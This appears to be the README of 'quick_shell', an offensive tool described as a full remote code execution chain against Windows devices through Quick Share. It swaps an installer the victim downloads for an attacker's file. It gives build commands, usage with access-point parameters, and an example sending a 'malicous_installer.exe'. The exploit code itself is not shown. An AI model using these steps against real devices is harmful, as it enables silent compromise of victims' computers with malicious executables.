# quick_shell

Implements the full RCE chain, replacing an installer executable downloaded by a victim’s Windows device through Quick Share.

## Build
Run:
```cmd
bazel build //quick_shell_rce_tool:quick_shell
```
The executable will be created in `./bazel-bin/quick_shell_rce_tool`

## Usage
Turn on the hotspot on the Windows attacker computer, and run:
```cmd
quick_shell.exe <AP_ssid> <AP_pass> <AP_ip> <AP_freq> <file_to_send_path>
```

### Parameters:

* `AP_ssid`: the ssid of the access point.
* `AP_pass`: the password required to connect to the access point.
* `AP_ip`: the ip address of the access point.
* `AP_freq`: the frequency of the access point (can be retrieved using tools like smartphones' wifi analyzers)
* `file_to_send_path`: path to the file that will be sent to the victim.

### Example of running quick_shell:
```
quick_shell.exe testing_ap my_password 192.168.1.10 2701 malicous_installer.exe
```

